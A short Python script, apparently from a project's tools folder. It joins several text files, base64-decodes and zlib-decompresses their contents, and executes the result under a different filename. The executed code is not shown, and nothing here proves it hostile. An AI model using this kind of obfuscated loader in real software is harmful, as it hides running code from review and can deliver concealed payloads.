from __future__ import annotations

import base64
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
payload = "".join(path.read_text(encoding="utf-8") for path in sorted((ROOT / "tools").glob("c1_payload_*.txt")))
source = zlib.decompress(base64.b64decode(payload)).decode("utf-8")
exec(compile(source, "tools/implement_tw_c1.py", "exec"))
